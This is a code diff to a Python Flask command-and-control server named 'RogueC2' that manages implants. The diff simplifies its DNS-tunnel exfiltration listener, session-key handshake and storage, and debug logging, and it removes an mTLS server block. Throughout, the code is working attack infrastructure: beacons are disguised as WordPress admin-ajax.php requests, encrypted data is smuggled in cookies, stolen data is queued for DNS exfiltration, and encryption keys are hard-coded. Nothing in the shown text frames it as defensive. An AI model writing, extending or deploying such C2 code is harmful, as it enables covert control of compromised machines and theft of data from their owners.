@@ -30,13 +30,11 @@ from Crypto.Cipher import AES
 # Try to import DNS tunnel module from payloads
 try:
     sys.path.append(os.path.join(os.path.dirname(__file__), 'payloads'))
-    from dnstunnel import DNSFragmenter, DNSTunnel
+    from dnstunnel import DNSFragmenter, DNSListener
     DNS_AVAILABLE = True
-    print("[+] DNS tunnel module loaded successfully")
-except ImportError as e:
+except ImportError:
     DNS_AVAILABLE = False
-    print(f"[!] DNS tunnel module not found: {e}")
-    print("[!] Exfiltration will use HTTPS only.")
+    print("[!] DNS tunnel module not found. Exfiltration will use HTTPS only.")
 
 app = Flask(__name__)
 app.secret_key = 'RogueC2_Malleable_v1'
@@ -56,8 +54,8 @@ UPLOAD_DIR.mkdir(exist_ok=True)
 NGINX_DIR.mkdir(exist_ok=True)
 
 # DNS tunnel configuration
-DNS_DOMAIN = "updates.rogue-c2.com"  # Change to your domain
-DNS_LISTEN_PORT = 5354  # Use 5354 to avoid conflict with system DNS (53) and OpenClaw (5353)
+DNS_DOMAIN = "updates.your-domain.com"  # Change to your domain
+DNS_LISTEN_PORT = 53
 
 # Legacy key (for backward compatibility)
 LEGACY_SECRET_KEY = b'6767BabyROGUE!&%5'
@@ -254,34 +252,10 @@ class DNSExfilManager:
     def _run_listener(self):
         """Run DNS listener."""
         try:
-            # Try DNS_LISTEN_PORT first, fall back to other ports
-            ports_to_try = [DNS_LISTEN_PORT, 5355, 5356]
-            
-            for port in ports_to_try:
-                try:
-                    self.listener = DNSTunnel(
-                        domain=self.domain,
-                        mode="server",
-                        listen_ip="0.0.0.0",
-                        listen_port=port
-                    )
-                    print(f"[+] DNS tunnel server starting on port {port}")
-                    print(f"[+] Domain: *.{self.domain}")
-                    self.listener.start_server()
-                    return  # Success!
-                except OSError as e:
-                    if "Address already in use" in str(e) and port == DNS_LISTEN_PORT:
-                        print(f"[!] Port {port} in use, trying port 5353...")
-                        continue
-                    else:
-                        raise e
-                        
-            print("[!] Could not start DNS server on any port")
-            
+            self.listener = DNSListener(self.domain)
+            self.listener.start()
         except Exception as e:
             print(f"[-] DNS listener error: {e}")
-            import traceback
-            traceback.print_exc()
             
     def queue_for_exfil(self, implant_id: str, data: bytes, filename: str = None):
         """Queue data for DNS exfiltration."""
@@ -325,30 +299,17 @@ class DNSExfilManager:
 
 # ========== Helper Functions ==========
 def get_session_key(implant_id):
-    # First check in-memory cache
     if implant_id in session_keys:
         return session_keys[implant_id]
-    
-    # Check database
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    
-    # Try exact match first
     c.execute('SELECT session_key FROM implants WHERE implant_id = ?', (implant_id,))
     row = c.fetchone()
-    
-    # If not found, try to find by implant_hash (fingerprint prefix)
-    if not row or not row[0]:
-        c.execute('SELECT session_key FROM implants WHERE implant_hash = ?', (implant_id[:16],))
-        row = c.fetchone()
-    
     conn.close()
-    
     if row and row[0]:
         key = base64.b64decode(row[0])
         session_keys[implant_id] = key
         return key
-    
     return None
 
 def store_session_key(implant_id, key):
@@ -373,7 +334,6 @@ def legacy_decrypt(data: bytes) -> str:
 
 def extract_data_from_cookie(request):
     """Extract encrypted data from any of several possible cookie names."""
-    sys.stderr.write(f"[EXTRACT] Cookie header: {request.headers.get('Cookie', 'NO COOKIES')}\n")
     cookie_header = request.headers.get('Cookie', '')
     
     for name in COOKIE_NAMES:
@@ -508,48 +468,10 @@ def handshake():
         key = Fernet.generate_key()
         pending_keys[fingerprint] = (key, time.time())
         
-        # Store in session_keys with multiple identifiers for lookup
-        # 1. Use implant_id_hash if provided
-        implant_id_hash = data.get('implant_id_hash')
-        if implant_id_hash:
-            session_keys[implant_id_hash] = key
-            print(f"[DEBUG] Stored session key for implant_id_hash: {implant_id_hash}")
-        
-        # 2. Also store with implant_id if provided
-        implant_id = data.get('implant_id')
-        if implant_id:
-            session_keys[implant_id] = key
-            print(f"[DEBUG] Stored session key for implant_id: {implant_id}")
-        
-        # 3. Store in database for persistent lookup
-        conn = sqlite3.connect(DB_PATH)
-        c = conn.cursor()
-        
-        # Use implant_id if available, otherwise use hash
-        db_implant_id = implant_id or implant_id_hash or fingerprint[:16]
-        
-        c.execute('''
-            INSERT OR REPLACE INTO implants 
-            (implant_id, implant_hash, session_key, first_seen, last_beacon, beacon_count)
-            VALUES (?, ?, ?, datetime("now"), datetime("now"), 1)
-        ''', (
-            db_implant_id,
-            fingerprint[:16],
-            base64.b64encode(key).decode()
-        ))
-        conn.commit()
-        conn.close()
-        
-        print(f"[DEBUG] Stored in database: implant_id={db_implant_id}")
-        
         # Auto-cleanup after 5 minutes
         def cleanup():
             time.sleep(300)
             pending_keys.pop(fingerprint, None)
-            if implant_id_hash:
-                session_keys.pop(implant_id_hash, None)
-            if implant_id:
-                session_keys.pop(implant_id, None)
         threading.Thread(target=cleanup, daemon=True).start()
         
         return jsonify({'key': key.decode()})
@@ -589,7 +511,6 @@ def list_payloads():
 @app.route('/wp-admin/admin-ajax.php', methods=['POST'])
 def beacon_handler():
     try:
-        sys.stderr.write("[BEACON_HANDLER] Called!\n")
         encrypted = extract_data_from_cookie(request)
         implant_id = get_implant_id_from_auth(request)
         
@@ -604,7 +525,6 @@ def beacon_handler():
         key = get_session_key(implant_id)
         if not key:
             print(f"[DEBUG] No session key for implant_id: {implant_id}")
-            print(f"[DEBUG] session_keys keys: {list(session_keys.keys())}")
             print(f"[DEBUG] pending_keys count: {len(pending_keys)}")
             # Try to find key in pending_keys by checking all fingerprints
             for fp, (pending_key, timestamp) in pending_keys.items():
@@ -1247,7 +1167,7 @@ if __name__ == '__main__':
     parser.add_argument('--deploy-nginx', action='store_true', help='Generate and deploy Nginx config')
     parser.add_argument('--domain', default='_', help='Domain for Nginx config')
     parser.add_argument('--no-dns', action='store_true', help='Disable DNS tunnel')
-    parser.add_argument('--dns-domain', default='updates.rogue-c2.com', help='Domain for DNS tunnel')
+    parser.add_argument('--dns-domain', default='updates.your-domain.com', help='Domain for DNS tunnel')
     
     args = parser.parse_args()
     
@@ -1302,32 +1222,4 @@ if __name__ == '__main__':
     print("  GET  /phase1/dashboard           - Web dashboard")
     print("=" * 60)
     
-
-# mTLS Configuration
-import ssl
-MTLS_CERT = "certs/server.crt"
-MTLS_KEY = "certs/server.key"
-MTLS_CA = "certs/ca.crt"
-
-def create_ssl_context():
-    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-    context.verify_mode = ssl.CERT_REQUIRED
-    context.load_cert_chain(certfile=MTLS_CERT, keyfile=MTLS_KEY)
-    context.load_verify_locations(cafile=MTLS_CA)
-    return context
-
-# Start mTLS server
-ssl_context = create_ssl_context()
-print("[+] mTLS enabled on port 4443")
-
-# Run both HTTP and HTTPS
-import threading
-def run_https():
-    app.run(host=C2_HOST, port=4443, ssl_context=ssl_context, debug=False, threaded=True)
-
-def run_http():
     app.run(host=C2_HOST, port=C2_PORT, debug=False, threaded=True)
-
-https_thread = threading.Thread(target=run_https, daemon=True)
-https_thread.start()
-run_http()
